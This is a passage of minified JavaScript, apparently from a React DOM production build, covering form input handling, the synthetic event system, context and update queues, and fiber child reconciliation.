b);a.defaultValue=b}c=a.name;""!==c&&(a.name="");a.defaultChecked=!!a._wrapperState.initialChecked;""!==c&&(a.name=c)}function Ed(a,b,c){if("number"!==b||a.ownerDocument.activeElement!==a)null==c?a.defaultValue=""+a._wrapperState.initialValue:a.defaultValue!==""+c&&(a.defaultValue=""+c)}function ui(a){var b="";ea.Children.forEach(a,function(a){null!=a&&(b+=a)});return b}function Fd(a,b){a=M({children:void 0},b);if(b=ui(b.children))a.children=b;return a}function hb(a,b,c,d){a=a.options;if(b){b={};
for(var e=0;e<c.length;e++)b["$"+c[e]]=!0;for(c=0;c<a.length;c++)e=b.hasOwnProperty("$"+a[c].value),a[c].selected!==e&&(a[c].selected=e),e&&d&&(a[c].defaultSelected=!0)}else{c=""+va(c);b=null;for(e=0;e<a.length;e++){if(a[e].value===c){a[e].selected=!0;d&&(a[e].defaultSelected=!0);return}null!==b||a[e].disabled||(b=a[e])}null!==b&&(b.selected=!0)}}function Gd(a,b){if(null!=b.dangerouslySetInnerHTML)throw Error(k(91));return M({},b,{value:void 0,defaultValue:void 0,children:""+a._wrapperState.initialValue})}
function Kf(a,b){var c=b.value;if(null==c){c=b.children;b=b.defaultValue;if(null!=c){if(null!=b)throw Error(k(92));if(Array.isArray(c)){if(!(1>=c.length))throw Error(k(93));c=c[0]}b=c}null==b&&(b="");c=b}a._wrapperState={initialValue:va(c)}}function Lf(a,b){var c=va(b.value),d=va(b.defaultValue);null!=c&&(c=""+c,c!==a.value&&(a.value=c),null==b.defaultValue&&a.defaultValue!==c&&(a.defaultValue=c));null!=d&&(a.defaultValue=""+d)}function Mf(a,b){b=a.textContent;b===a._wrapperState.initialValue&&""!==
b&&null!==b&&(a.value=b)}function Nf(a){switch(a){case "svg":return"http://www.w3.org/2000/svg";case "math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function Hd(a,b){return null==a||"http://www.w3.org/1999/xhtml"===a?Nf(b):"http://www.w3.org/2000/svg"===a&&"foreignObject"===b?"http://www.w3.org/1999/xhtml":a}function nc(a,b){var c={};c[a.toLowerCase()]=b.toLowerCase();c["Webkit"+a]="webkit"+b;c["Moz"+a]="moz"+b;return c}function oc(a){if(Id[a])return Id[a];
if(!ib[a])return a;var b=ib[a],c;for(c in b)if(b.hasOwnProperty(c)&&c in Of)return Id[a]=b[c];return a}function Jd(a){var b=Pf.get(a);void 0===b&&(b=new Map,Pf.set(a,b));return b}function Na(a){var b=a,c=a;if(a.alternate)for(;b.return;)b=b.return;else{a=b;do b=a,0!==(b.effectTag&1026)&&(c=b.return),a=b.return;while(a)}return 3===b.tag?c:null}function Qf(a){if(13===a.tag){var b=a.memoizedState;null===b&&(a=a.alternate,null!==a&&(b=a.memoizedState));if(null!==b)return b.dehydrated}return null}function Rf(a){if(Na(a)!==
a)throw Error(k(188));}function vi(a){var b=a.alternate;if(!b){b=Na(a);if(null===b)throw Error(k(188));return b!==a?null:a}for(var c=a,d=b;;){var e=c.return;if(null===e)break;var f=e.alternate;if(null===f){d=e.return;if(null!==d){c=d;continue}break}if(e.child===f.child){for(f=e.child;f;){if(f===c)return Rf(e),a;if(f===d)return Rf(e),b;f=f.sibling}throw Error(k(188));}if(c.return!==d.return)c=e,d=f;else{for(var g=!1,h=e.child;h;){if(h===c){g=!0;c=e;d=f;break}if(h===d){g=!0;d=e;c=f;break}h=h.sibling}if(!g){for(h=
f.child;h;){if(h===c){g=!0;c=f;d=e;break}if(h===d){g=!0;d=f;c=e;break}h=h.sibling}if(!g)throw Error(k(189));}}if(c.alternate!==d)throw Error(k(190));}if(3!==c.tag)throw Error(k(188));return c.stateNode.current===c?a:b}function Sf(a){a=vi(a);if(!a)return null;for(var b=a;;){if(5===b.tag||6===b.tag)return b;if(b.child)b.child.return=b,b=b.child;else{if(b===a)break;for(;!b.sibling;){if(!b.return||b.return===a)return null;b=b.return}b.sibling.return=b.return;b=b.sibling}}return null}function jb(a,b){if(null==
b)throw Error(k(30));if(null==a)return b;if(Array.isArray(a)){if(Array.isArray(b))return a.push.apply(a,b),a;a.push(b);return a}return Array.isArray(b)?[a].concat(b):[a,b]}function Kd(a,b,c){Array.isArray(a)?a.forEach(b,c):a&&b.call(c,a)}function pc(a){null!==a&&(Ab=jb(Ab,a));a=Ab;Ab=null;if(a){Kd(a,wi);if(Ab)throw Error(k(95));if(hc)throw a=pd,hc=!1,pd=null,a;}}function Ld(a){a=a.target||a.srcElement||window;a.correspondingUseElement&&(a=a.correspondingUseElement);return 3===a.nodeType?a.parentNode:
a}function Tf(a){if(!wa)return!1;a="on"+a;var b=a in document;b||(b=document.createElement("div"),b.setAttribute(a,"return;"),b="function"===typeof b[a]);return b}function Uf(a){a.topLevelType=null;a.nativeEvent=null;a.targetInst=null;a.ancestors.length=0;10>qc.length&&qc.push(a)}function Vf(a,b,c,d){if(qc.length){var e=qc.pop();e.topLevelType=a;e.eventSystemFlags=d;e.nativeEvent=b;e.targetInst=c;return e}return{topLevelType:a,eventSystemFlags:d,nativeEvent:b,targetInst:c,ancestors:[]}}function Wf(a){var b=
a.targetInst,c=b;do{if(!c){a.ancestors.push(c);break}var d=c;if(3===d.tag)d=d.stateNode.containerInfo;else{for(;d.return;)d=d.return;d=3!==d.tag?null:d.stateNode.containerInfo}if(!d)break;b=c.tag;5!==b&&6!==b||a.ancestors.push(c);c=Bb(d)}while(c);for(c=0;c<a.ancestors.length;c++){b=a.ancestors[c];var e=Ld(a.nativeEvent);d=a.topLevelType;var f=a.nativeEvent,g=a.eventSystemFlags;0===c&&(g|=64);for(var h=null,m=0;m<jc.length;m++){var n=jc[m];n&&(n=n.extractEvents(d,b,f,e,g))&&(h=jb(h,n))}pc(h)}}function Md(a,
b,c){if(!c.has(a)){switch(a){case "scroll":Cb(b,"scroll",!0);break;case "focus":case "blur":Cb(b,"focus",!0);Cb(b,"blur",!0);c.set("blur",null);c.set("focus",null);break;case "cancel":case "close":Tf(a)&&Cb(b,a,!0);break;case "invalid":case "submit":case "reset":break;default:-1===Db.indexOf(a)&&w(a,b)}c.set(a,null)}}function xi(a,b){var c=Jd(b);Nd.forEach(function(a){Md(a,b,c)});yi.forEach(function(a){Md(a,b,c)})}function Od(a,b,c,d,e){return{blockedOn:a,topLevelType:b,eventSystemFlags:c|32,nativeEvent:e,
container:d}}function Xf(a,b){switch(a){case "focus":case "blur":xa=null;break;case "dragenter":case "dragleave":ya=null;break;case "mouseover":case "mouseout":za=null;break;case "pointerover":case "pointerout":Eb.delete(b.pointerId);break;case "gotpointercapture":case "lostpointercapture":Fb.delete(b.pointerId)}}function Gb(a,b,c,d,e,f){if(null===a||a.nativeEvent!==f)return a=Od(b,c,d,e,f),null!==b&&(b=Hb(b),null!==b&&Yf(b)),a;a.eventSystemFlags|=d;return a}function zi(a,b,c,d,e){switch(b){case "focus":return xa=
Gb(xa,a,b,c,d,e),!0;case "dragenter":return ya=Gb(ya,a,b,c,d,e),!0;case "mouseover":return za=Gb(za,a,b,c,d,e),!0;case "pointerover":var f=e.pointerId;Eb.set(f,Gb(Eb.get(f)||null,a,b,c,d,e));return!0;case "gotpointercapture":return f=e.pointerId,Fb.set(f,Gb(Fb.get(f)||null,a,b,c,d,e)),!0}return!1}function Ai(a){var b=Bb(a.target);if(null!==b){var c=Na(b);if(null!==c)if(b=c.tag,13===b){if(b=Qf(c),null!==b){a.blockedOn=b;Pd(a.priority,function(){Bi(c)});return}}else if(3===b&&c.stateNode.hydrate){a.blockedOn=
3===c.tag?c.stateNode.containerInfo:null;return}}a.blockedOn=null}function rc(a){if(null!==a.blockedOn)return!1;var b=Qd(a.topLevelType,a.eventSystemFlags,a.container,a.nativeEvent);if(null!==b){var c=Hb(b);null!==c&&Yf(c);a.blockedOn=b;return!1}return!0}function Zf(a,b,c){rc(a)&&c.delete(b)}function Ci(){for(Rd=!1;0<fa.length;){var a=fa[0];if(null!==a.blockedOn){a=Hb(a.blockedOn);null!==a&&Di(a);break}var b=Qd(a.topLevelType,a.eventSystemFlags,a.container,a.nativeEvent);null!==b?a.blockedOn=b:fa.shift()}null!==
xa&&rc(xa)&&(xa=null);null!==ya&&rc(ya)&&(ya=null);null!==za&&rc(za)&&(za=null);Eb.forEach(Zf);Fb.forEach(Zf)}function Ib(a,b){a.blockedOn===b&&(a.blockedOn=null,Rd||(Rd=!0,$f(ag,Ci)))}function bg(a){if(0<fa.length){Ib(fa[0],a);for(var b=1;b<fa.length;b++){var c=fa[b];c.blockedOn===a&&(c.blockedOn=null)}}null!==xa&&Ib(xa,a);null!==ya&&Ib(ya,a);null!==za&&Ib(za,a);b=function(b){return Ib(b,a)};Eb.forEach(b);Fb.forEach(b);for(b=0;b<Jb.length;b++)c=Jb[b],c.blockedOn===a&&(c.blockedOn=null);for(;0<Jb.length&&
(b=Jb[0],null===b.blockedOn);)Ai(b),null===b.blockedOn&&Jb.shift()}function Sd(a,b){for(var c=0;c<a.length;c+=2){var d=a[c],e=a[c+1],f="on"+(e[0].toUpperCase()+e.slice(1));f={phasedRegistrationNames:{bubbled:f,captured:f+"Capture"},dependencies:[d],eventPriority:b};Td.set(d,b);cg.set(d,f);dg[e]=f}}function w(a,b){Cb(b,a,!1)}function Cb(a,b,c){var d=Td.get(b);switch(void 0===d?2:d){case 0:d=Ei.bind(null,b,1,a);break;case 1:d=Fi.bind(null,b,1,a);break;default:d=sc.bind(null,b,1,a)}c?a.addEventListener(b,
d,!0):a.addEventListener(b,d,!1)}function Ei(a,b,c,d){Oa||vd();var e=sc,f=Oa;Oa=!0;try{eg(e,a,b,c,d)}finally{(Oa=f)||ud()}}function Fi(a,b,c,d){Gi(Hi,sc.bind(null,a,b,c,d))}function sc(a,b,c,d){if(tc)if(0<fa.length&&-1<Nd.indexOf(a))a=Od(null,a,b,c,d),fa.push(a);else{var e=Qd(a,b,c,d);if(null===e)Xf(a,d);else if(-1<Nd.indexOf(a))a=Od(e,a,b,c,d),fa.push(a);else if(!zi(e,a,b,c,d)){Xf(a,d);a=Vf(a,d,null,b);try{uf(Wf,a)}finally{Uf(a)}}}}function Qd(a,b,c,d){c=Ld(d);c=Bb(c);if(null!==c){var e=Na(c);if(null===
e)c=null;else{var f=e.tag;if(13===f){c=Qf(e);if(null!==c)return c;c=null}else if(3===f){if(e.stateNode.hydrate)return 3===e.tag?e.stateNode.containerInfo:null;c=null}else e!==c&&(c=null)}}a=Vf(a,d,c,b);try{uf(Wf,a)}finally{Uf(a)}return null}function fg(a,b,c){return null==b||"boolean"===typeof b||""===b?"":c||"number"!==typeof b||0===b||Kb.hasOwnProperty(a)&&Kb[a]?(""+b).trim():b+"px"}function gg(a,b){a=a.style;for(var c in b)if(b.hasOwnProperty(c)){var d=0===c.indexOf("--"),e=fg(c,b[c],d);"float"===
c&&(c="cssFloat");d?a.setProperty(c,e):a[c]=e}}function Ud(a,b){if(b){if(Ii[a]&&(null!=b.children||null!=b.dangerouslySetInnerHTML))throw Error(k(137,a,""));if(null!=b.dangerouslySetInnerHTML){if(null!=b.children)throw Error(k(60));if(!("object"===typeof b.dangerouslySetInnerHTML&&"__html"in b.dangerouslySetInnerHTML))throw Error(k(61));}if(null!=b.style&&"object"!==typeof b.style)throw Error(k(62,""));}}function Vd(a,b){if(-1===a.indexOf("-"))return"string"===typeof b.is;switch(a){case "annotation-xml":case "color-profile":case "font-face":case "font-face-src":case "font-face-uri":case "font-face-format":case "font-face-name":case "missing-glyph":return!1;
default:return!0}}function oa(a,b){a=9===a.nodeType||11===a.nodeType?a:a.ownerDocument;var c=Jd(a);b=rd[b];for(var d=0;d<b.length;d++)Md(b[d],a,c)}function uc(){}function Wd(a){a=a||("undefined"!==typeof document?document:void 0);if("undefined"===typeof a)return null;try{return a.activeElement||a.body}catch(b){return a.body}}function hg(a){for(;a&&a.firstChild;)a=a.firstChild;return a}function ig(a,b){var c=hg(a);a=0;for(var d;c;){if(3===c.nodeType){d=a+c.textContent.length;if(a<=b&&d>=b)return{node:c,
offset:b-a};a=d}a:{for(;c;){if(c.nextSibling){c=c.nextSibling;break a}c=c.parentNode}c=void 0}c=hg(c)}}function jg(a,b){return a&&b?a===b?!0:a&&3===a.nodeType?!1:b&&3===b.nodeType?jg(a,b.parentNode):"contains"in a?a.contains(b):a.compareDocumentPosition?!!(a.compareDocumentPosition(b)&16):!1:!1}function kg(){for(var a=window,b=Wd();b instanceof a.HTMLIFrameElement;){try{var c="string"===typeof b.contentWindow.location.href}catch(d){c=!1}if(c)a=b.contentWindow;else break;b=Wd(a.document)}return b}
function Xd(a){var b=a&&a.nodeName&&a.nodeName.toLowerCase();return b&&("input"===b&&("text"===a.type||"search"===a.type||"tel"===a.type||"url"===a.type||"password"===a.type)||"textarea"===b||"true"===a.contentEditable)}function lg(a,b){switch(a){case "button":case "input":case "select":case "textarea":return!!b.autoFocus}return!1}function Yd(a,b){return"textarea"===a||"option"===a||"noscript"===a||"string"===typeof b.children||"number"===typeof b.children||"object"===typeof b.dangerouslySetInnerHTML&&
null!==b.dangerouslySetInnerHTML&&null!=b.dangerouslySetInnerHTML.__html}function kb(a){for(;null!=a;a=a.nextSibling){var b=a.nodeType;if(1===b||3===b)break}return a}function mg(a){a=a.previousSibling;for(var b=0;a;){if(8===a.nodeType){var c=a.data;if(c===ng||c===Zd||c===$d){if(0===b)return a;b--}else c===og&&b++}a=a.previousSibling}return null}function Bb(a){var b=a[Aa];if(b)return b;for(var c=a.parentNode;c;){if(b=c[Lb]||c[Aa]){c=b.alternate;if(null!==b.child||null!==c&&null!==c.child)for(a=mg(a);null!==
a;){if(c=a[Aa])return c;a=mg(a)}return b}a=c;c=a.parentNode}return null}function Hb(a){a=a[Aa]||a[Lb];return!a||5!==a.tag&&6!==a.tag&&13!==a.tag&&3!==a.tag?null:a}function Pa(a){if(5===a.tag||6===a.tag)return a.stateNode;throw Error(k(33));}function ae(a){return a[vc]||null}function pa(a){do a=a.return;while(a&&5!==a.tag);return a?a:null}function pg(a,b){var c=a.stateNode;if(!c)return null;var d=td(c);if(!d)return null;c=d[b];a:switch(b){case "onClick":case "onClickCapture":case "onDoubleClick":case "onDoubleClickCapture":case "onMouseDown":case "onMouseDownCapture":case "onMouseMove":case "onMouseMoveCapture":case "onMouseUp":case "onMouseUpCapture":case "onMouseEnter":(d=
!d.disabled)||(a=a.type,d=!("button"===a||"input"===a||"select"===a||"textarea"===a));a=!d;break a;default:a=!1}if(a)return null;if(c&&"function"!==typeof c)throw Error(k(231,b,typeof c));return c}function qg(a,b,c){if(b=pg(a,c.dispatchConfig.phasedRegistrationNames[b]))c._dispatchListeners=jb(c._dispatchListeners,b),c._dispatchInstances=jb(c._dispatchInstances,a)}function Ji(a){if(a&&a.dispatchConfig.phasedRegistrationNames){for(var b=a._targetInst,c=[];b;)c.push(b),b=pa(b);for(b=c.length;0<b--;)qg(c[b],
"captured",a);for(b=0;b<c.length;b++)qg(c[b],"bubbled",a)}}function be(a,b,c){a&&c&&c.dispatchConfig.registrationName&&(b=pg(a,c.dispatchConfig.registrationName))&&(c._dispatchListeners=jb(c._dispatchListeners,b),c._dispatchInstances=jb(c._dispatchInstances,a))}function Ki(a){a&&a.dispatchConfig.registrationName&&be(a._targetInst,null,a)}function lb(a){Kd(a,Ji)}function rg(){if(wc)return wc;var a,b=ce,c=b.length,d,e="value"in Ba?Ba.value:Ba.textContent,f=e.length;for(a=0;a<c&&b[a]===e[a];a++);var g=
c-a;for(d=1;d<=g&&b[c-d]===e[f-d];d++);return wc=e.slice(a,1<d?1-d:void 0)}function xc(){return!0}function yc(){return!1}function R(a,b,c,d){this.dispatchConfig=a;this._targetInst=b;this.nativeEvent=c;a=this.constructor.Interface;for(var e in a)a.hasOwnProperty(e)&&((b=a[e])?this[e]=b(c):"target"===e?this.target=d:this[e]=c[e]);this.isDefaultPrevented=(null!=c.defaultPrevented?c.defaultPrevented:!1===c.returnValue)?xc:yc;this.isPropagationStopped=yc;return this}function Li(a,b,c,d){if(this.eventPool.length){var e=
this.eventPool.pop();this.call(e,a,b,c,d);return e}return new this(a,b,c,d)}function Mi(a){if(!(a instanceof this))throw Error(k(279));a.destructor();10>this.eventPool.length&&this.eventPool.push(a)}function sg(a){a.eventPool=[];a.getPooled=Li;a.release=Mi}function tg(a,b){switch(a){case "keyup":return-1!==Ni.indexOf(b.keyCode);case "keydown":return 229!==b.keyCode;case "keypress":case "mousedown":case "blur":return!0;default:return!1}}function ug(a){a=a.detail;return"object"===typeof a&&"data"in
a?a.data:null}function Oi(a,b){switch(a){case "compositionend":return ug(b);case "keypress":if(32!==b.which)return null;vg=!0;return wg;case "textInput":return a=b.data,a===wg&&vg?null:a;default:return null}}function Pi(a,b){if(mb)return"compositionend"===a||!de&&tg(a,b)?(a=rg(),wc=ce=Ba=null,mb=!1,a):null;switch(a){case "paste":return null;case "keypress":if(!(b.ctrlKey||b.altKey||b.metaKey)||b.ctrlKey&&b.altKey){if(b.char&&1<b.char.length)return b.char;if(b.which)return String.fromCharCode(b.which)}return null;
case "compositionend":return xg&&"ko"!==b.locale?null:b.data;default:return null}}function yg(a){var b=a&&a.nodeName&&a.nodeName.toLowerCase();return"input"===b?!!Qi[a.type]:"textarea"===b?!0:!1}function zg(a,b,c){a=R.getPooled(Ag.change,a,b,c);a.type="change";sf(c);lb(a);return a}function Ri(a){pc(a)}function zc(a){var b=Pa(a);if(Gf(b))return a}function Si(a,b){if("change"===a)return b}function Bg(){Mb&&(Mb.detachEvent("onpropertychange",Cg),Nb=Mb=null)}function Cg(a){if("value"===a.propertyName&&
zc(Nb))if(a=zg(Nb,a,Ld(a)),Oa)pc(a);else{Oa=!0;try{ee(Ri,a)}finally{Oa=!1,ud()}}}function Ti(a,b,c){"focus"===a?(Bg(),Mb=b,Nb=c,Mb.attachEvent("onpropertychange",Cg)):"blur"===a&&Bg()}function Ui(a,b){if("selectionchange"===a||"keyup"===a||"keydown"===a)return zc(Nb)}function Vi(a,b){if("click"===a)return zc(b)}function Wi(a,b){if("input"===a||"change"===a)return zc(b)}function Xi(a){var b=this.nativeEvent;return b.getModifierState?b.getModifierState(a):(a=Yi[a])?!!b[a]:!1}function fe(a){return Xi}
function Zi(a,b){return a===b&&(0!==a||1/a===1/b)||a!==a&&b!==b}function Ob(a,b){if(Qa(a,b))return!0;if("object"!==typeof a||null===a||"object"!==typeof b||null===b)return!1;var c=Object.keys(a),d=Object.keys(b);if(c.length!==d.length)return!1;for(d=0;d<c.length;d++)if(!$i.call(b,c[d])||!Qa(a[c[d]],b[c[d]]))return!1;return!0}function Dg(a,b){var c=b.window===b?b.document:9===b.nodeType?b:b.ownerDocument;if(ge||null==nb||nb!==Wd(c))return null;c=nb;"selectionStart"in c&&Xd(c)?c={start:c.selectionStart,
end:c.selectionEnd}:(c=(c.ownerDocument&&c.ownerDocument.defaultView||window).getSelection(),c={anchorNode:c.anchorNode,anchorOffset:c.anchorOffset,focusNode:c.focusNode,focusOffset:c.focusOffset});return Pb&&Ob(Pb,c)?null:(Pb=c,a=R.getPooled(Eg.select,he,a,b),a.type="select",a.target=nb,lb(a),a)}function Ac(a){var b=a.keyCode;"charCode"in a?(a=a.charCode,0===a&&13===b&&(a=13)):a=b;10===a&&(a=13);return 32<=a||13===a?a:0}function q(a,b){0>ob||(a.current=ie[ob],ie[ob]=null,ob--)}function y(a,b,c){ob++;
ie[ob]=a.current;a.current=b}function pb(a,b){var c=a.type.contextTypes;if(!c)return Ca;var d=a.stateNode;if(d&&d.__reactInternalMemoizedUnmaskedChildContext===b)return d.__reactInternalMemoizedMaskedChildContext;var e={},f;for(f in c)e[f]=b[f];d&&(a=a.stateNode,a.__reactInternalMemoizedUnmaskedChildContext=b,a.__reactInternalMemoizedMaskedChildContext=e);return e}function N(a){a=a.childContextTypes;return null!==a&&void 0!==a}function Fg(a,b,c){if(B.current!==Ca)throw Error(k(168));y(B,b);y(G,c)}
function Gg(a,b,c){var d=a.stateNode;a=b.childContextTypes;if("function"!==typeof d.getChildContext)return c;d=d.getChildContext();for(var e in d)if(!(e in a))throw Error(k(108,na(b)||"Unknown",e));return M({},c,{},d)}function Bc(a){a=(a=a.stateNode)&&a.__reactInternalMemoizedMergedChildContext||Ca;Ra=B.current;y(B,a);y(G,G.current);return!0}function Hg(a,b,c){var d=a.stateNode;if(!d)throw Error(k(169));c?(a=Gg(a,b,Ra),d.__reactInternalMemoizedMergedChildContext=a,q(G),q(B),y(B,a)):q(G);y(G,c)}function Cc(){switch(aj()){case Dc:return 99;
case Ig:return 98;case Jg:return 97;case Kg:return 96;case Lg:return 95;default:throw Error(k(332));}}function Mg(a){switch(a){case 99:return Dc;case 98:return Ig;case 97:return Jg;case 96:return Kg;case 95:return Lg;default:throw Error(k(332));}}function Da(a,b){a=Mg(a);return bj(a,b)}function Ng(a,b,c){a=Mg(a);return je(a,b,c)}function Og(a){null===qa?(qa=[a],Ec=je(Dc,Pg)):qa.push(a);return Qg}function ha(){if(null!==Ec){var a=Ec;Ec=null;Rg(a)}Pg()}function Pg(){if(!ke&&null!==qa){ke=!0;var a=0;
try{var b=qa;Da(99,function(){for(;a<b.length;a++){var c=b[a];do c=c(!0);while(null!==c)}});qa=null}catch(c){throw null!==qa&&(qa=qa.slice(a+1)),je(Dc,ha),c;}finally{ke=!1}}}function Fc(a,b,c){c/=10;return 1073741821-(((1073741821-a+b/10)/c|0)+1)*c}function aa(a,b){if(a&&a.defaultProps){b=M({},b);a=a.defaultProps;for(var c in a)void 0===b[c]&&(b[c]=a[c])}return b}function le(){Gc=qb=Hc=null}function me(a){var b=Ic.current;q(Ic);a.type._context._currentValue=b}function Sg(a,b){for(;null!==a;){var c=
a.alternate;if(a.childExpirationTime<b)a.childExpirationTime=b,null!==c&&c.childExpirationTime<b&&(c.childExpirationTime=b);else if(null!==c&&c.childExpirationTime<b)c.childExpirationTime=b;else break;a=a.return}}function rb(a,b){Hc=a;Gc=qb=null;a=a.dependencies;null!==a&&null!==a.firstContext&&(a.expirationTime>=b&&(ia=!0),a.firstContext=null)}function W(a,b){if(Gc!==a&&!1!==b&&0!==b){if("number"!==typeof b||1073741823===b)Gc=a,b=1073741823;b={context:a,observedBits:b,next:null};if(null===qb){if(null===
Hc)throw Error(k(308));qb=b;Hc.dependencies={expirationTime:0,firstContext:b,responders:null}}else qb=qb.next=b}return a._currentValue}function ne(a){a.updateQueue={baseState:a.memoizedState,baseQueue:null,shared:{pending:null},effects:null}}function oe(a,b){a=a.updateQueue;b.updateQueue===a&&(b.updateQueue={baseState:a.baseState,baseQueue:a.baseQueue,shared:a.shared,effects:a.effects})}function Ea(a,b){a={expirationTime:a,suspenseConfig:b,tag:Tg,payload:null,callback:null,next:null};return a.next=
a}function Fa(a,b){a=a.updateQueue;if(null!==a){a=a.shared;var c=a.pending;null===c?b.next=b:(b.next=c.next,c.next=b);a.pending=b}}function Ug(a,b){var c=a.alternate;null!==c&&oe(c,a);a=a.updateQueue;c=a.baseQueue;null===c?(a.baseQueue=b.next=b,b.next=b):(b.next=c.next,c.next=b)}function Qb(a,b,c,d){var e=a.updateQueue;Ga=!1;var f=e.baseQueue,g=e.shared.pending;if(null!==g){if(null!==f){var h=f.next;f.next=g.next;g.next=h}f=g;e.shared.pending=null;h=a.alternate;null!==h&&(h=h.updateQueue,null!==h&&
(h.baseQueue=g))}if(null!==f){h=f.next;var m=e.baseState,n=0,k=null,ba=null,l=null;if(null!==h){var p=h;do{g=p.expirationTime;if(g<d){var t={expirationTime:p.expirationTime,suspenseConfig:p.suspenseConfig,tag:p.tag,payload:p.payload,callback:p.callback,next:null};null===l?(ba=l=t,k=m):l=l.next=t;g>n&&(n=g)}else{null!==l&&(l=l.next={expirationTime:1073741823,suspenseConfig:p.suspenseConfig,tag:p.tag,payload:p.payload,callback:p.callback,next:null});Vg(g,p.suspenseConfig);a:{var q=a,r=p;g=b;t=c;switch(r.tag){case 1:q=
r.payload;if("function"===typeof q){m=q.call(t,m,g);break a}m=q;break a;case 3:q.effectTag=q.effectTag&-4097|64;case Tg:q=r.payload;g="function"===typeof q?q.call(t,m,g):q;if(null===g||void 0===g)break a;m=M({},m,g);break a;case Jc:Ga=!0}}null!==p.callback&&(a.effectTag|=32,g=e.effects,null===g?e.effects=[p]:g.push(p))}p=p.next;if(null===p||p===h)if(g=e.shared.pending,null===g)break;else p=f.next=g.next,g.next=h,e.baseQueue=f=g,e.shared.pending=null}while(1)}null===l?k=m:l.next=ba;e.baseState=k;e.baseQueue=
l;Kc(n);a.expirationTime=n;a.memoizedState=m}}function Wg(a,b,c){a=b.effects;b.effects=null;if(null!==a)for(b=0;b<a.length;b++){var d=a[b],e=d.callback;if(null!==e){d.callback=null;d=e;e=c;if("function"!==typeof d)throw Error(k(191,d));d.call(e)}}}function Lc(a,b,c,d){b=a.memoizedState;c=c(d,b);c=null===c||void 0===c?b:M({},b,c);a.memoizedState=c;0===a.expirationTime&&(a.updateQueue.baseState=c)}function Xg(a,b,c,d,e,f,g){a=a.stateNode;return"function"===typeof a.shouldComponentUpdate?a.shouldComponentUpdate(d,
f,g):b.prototype&&b.prototype.isPureReactComponent?!Ob(c,d)||!Ob(e,f):!0}function Yg(a,b,c){var d=!1,e=Ca;var f=b.contextType;"object"===typeof f&&null!==f?f=W(f):(e=N(b)?Ra:B.current,d=b.contextTypes,f=(d=null!==d&&void 0!==d)?pb(a,e):Ca);b=new b(c,f);a.memoizedState=null!==b.state&&void 0!==b.state?b.state:null;b.updater=Mc;a.stateNode=b;b._reactInternalFiber=a;d&&(a=a.stateNode,a.__reactInternalMemoizedUnmaskedChildContext=e,a.__reactInternalMemoizedMaskedChildContext=f);return b}function Zg(a,
b,c,d){a=b.state;"function"===typeof b.componentWillReceiveProps&&b.componentWillReceiveProps(c,d);"function"===typeof b.UNSAFE_componentWillReceiveProps&&b.UNSAFE_componentWillReceiveProps(c,d);b.state!==a&&Mc.enqueueReplaceState(b,b.state,null)}function pe(a,b,c,d){var e=a.stateNode;e.props=c;e.state=a.memoizedState;e.refs=$g;ne(a);var f=b.contextType;"object"===typeof f&&null!==f?e.context=W(f):(f=N(b)?Ra:B.current,e.context=pb(a,f));Qb(a,c,e,d);e.state=a.memoizedState;f=b.getDerivedStateFromProps;
"function"===typeof f&&(Lc(a,b,f,c),e.state=a.memoizedState);"function"===typeof b.getDerivedStateFromProps||"function"===typeof e.getSnapshotBeforeUpdate||"function"!==typeof e.UNSAFE_componentWillMount&&"function"!==typeof e.componentWillMount||(b=e.state,"function"===typeof e.componentWillMount&&e.componentWillMount(),"function"===typeof e.UNSAFE_componentWillMount&&e.UNSAFE_componentWillMount(),b!==e.state&&Mc.enqueueReplaceState(e,e.state,null),Qb(a,c,e,d),e.state=a.memoizedState);"function"===
typeof e.componentDidMount&&(a.effectTag|=4)}function Rb(a,b,c){a=c.ref;if(null!==a&&"function"!==typeof a&&"object"!==typeof a){if(c._owner){c=c._owner;if(c){if(1!==c.tag)throw Error(k(309));var d=c.stateNode}if(!d)throw Error(k(147,a));var e=""+a;if(null!==b&&null!==b.ref&&"function"===typeof b.ref&&b.ref._stringRef===e)return b.ref;b=function(a){var b=d.refs;b===$g&&(b=d.refs={});null===a?delete b[e]:b[e]=a};b._stringRef=e;return b}if("string"!==typeof a)throw Error(k(284));if(!c._owner)throw Error(k(290,
a));}return a}function Nc(a,b){if("textarea"!==a.type)throw Error(k(31,"[object Object]"===Object.prototype.toString.call(b)?"object with keys {"+Object.keys(b).join(", ")+"}":b,""));}function ah(a){function b(b,c){if(a){var d=b.lastEffect;null!==d?(d.nextEffect=c,b.lastEffect=c):b.firstEffect=b.lastEffect=c;c.nextEffect=null;c.effectTag=8}}function c(c,d){if(!a)return null;for(;null!==d;)b(c,d),d=d.sibling;return null}function d(a,b){for(a=new Map;null!==b;)null!==b.key?a.set(b.key,b):a.set(b.index,
b),b=b.sibling;return a}function e(a,b){a=Sa(a,b);a.index=0;a.sibling=null;return a}function f(b,c,d){b.index=d;if(!a)return c;d=b.alternate;if(null!==d)return d=d.index,d<c?(b.effectTag=2,c):d;b.effectTag=2;return c}function g(b){a&&null===b.alternate&&(b.effectTag=2);return b}function h(a,b,c,d){if(null===b||6!==b.tag)return b=qe(c,a.mode,d),b.return=a,b;b=e(b,c);b.return=a;return b}function m(a,b,c,d){if(null!==b&&b.elementType===c.type)return d=e(b,c.props),d.ref=Rb(a,b,c),d.return=a,d;d=Oc(c.type,
c.key,c.props,null,a.mode,d);d.ref=Rb(a,b,c);d.return=a;return d}function n(a,b,c,d){if(null===b||4!==b.tag||b.stateNode.containerInfo!==c.containerInfo||b.stateNode.implementation!==c.implementation)return b=re(c,a.mode,d),b.return=a,b;b=e(b,c.children||[]);b.return=a;return b}function l(a,b,c,d,f){if(null===b||7!==b.tag)return b=Ha(c,a.mode,d,f),b.return=a,b;b=e(b,c);b.return=a;return b}function ba(a,b,c){if("string"===typeof b||"number"===typeof b)return b=qe(""+b,a.mode,c),b.return=a,b;if("object"===
typeof b&&null!==b){switch(b.$$typeof){case Pc:return c=Oc(b.type,b.key,b.props,null,a.mode,c),c.ref=Rb(a,null,b),c.return=a,c;case gb:return b=re(b,a.mode,c),b.return=a,b}if(Qc(b)||zb(b))return b=Ha(b,a.mode,c,null),b.return=a,b;Nc(a,b)}return null}function p(a,b,c,d){var e=null!==b?b.key:null;if("string"===typeof c||"number"===typeof c)return null!==e?null:h(a,b,""+c,d);if("object"===typeof c&&null!==c){switch(c.$$typeof){case Pc:return c.key===e?c.type===Ma?l(a,b,c.props.children,d,e):m(a,b,c,
